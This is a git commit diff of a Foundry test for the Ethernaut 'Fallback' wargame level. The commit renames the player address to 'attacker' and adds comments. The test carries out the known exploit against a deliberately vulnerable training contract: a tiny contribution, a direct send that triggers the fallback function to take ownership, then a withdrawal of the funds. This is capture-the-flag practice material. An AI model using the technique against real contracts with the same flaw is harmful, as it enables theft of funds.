dee96be333c1c0507069229506e53e21b7be2adb
solidoracle <solidoracle17@gmail.com>
2023-01-16 10:37:48 +0100

    update

--- test/1_Fallback.t.sol
+++ test/1_Fallback.t.sol
@@ -1,21 +1,21 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../src/levels/Fallback/FallbackFactory.sol";
+import "../src/levels/1_Fallback/FallbackFactory.sol";
 import "../src/core/Ethernaut.sol";
 import "./utils/vm.sol";
 
 contract FallbackTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
-    address eoaAddress = address(100);
+    address attacker = address(100);
     
 
     function setUp() public {
         // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
         // Deal EOA address some ether
-        vm.deal(eoaAddress, 5 ether);
+        vm.deal(attacker, 5 ether);
     }
 
     function testFallbackHack() public {
@@ -25,7 +25,8 @@ contract FallbackTest is DSTest {
 
         FallbackFactory fallbackFactory = new FallbackFactory();
         ethernaut.registerLevel(fallbackFactory);
-        vm.startPrank(eoaAddress);
+        // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
+        vm.startPrank(attacker);
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
         Fallback ethernautFallback = Fallback(payable(levelAddress));
 
@@ -35,12 +36,12 @@ contract FallbackTest is DSTest {
 
         // Contribute 1 wei - verify contract state has been updated
         ethernautFallback.contribute{value: 1 wei}();
-        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);
+        assertEq(ethernautFallback.contributions(attacker), 1 wei);
 
         // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
         payable(address(ethernautFallback)).call{value: 1 wei}("");
         // Verify contract owner has been updated to 0 address
-        assertEq(ethernautFallback.owner(), eoaAddress);
+        assertEq(ethernautFallback.owner(), attacker);
 
         // Withdraw from contract - Check contract balance before and after
         emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
@@ -50,7 +51,6 @@ contract FallbackTest is DSTest {
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
-        
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
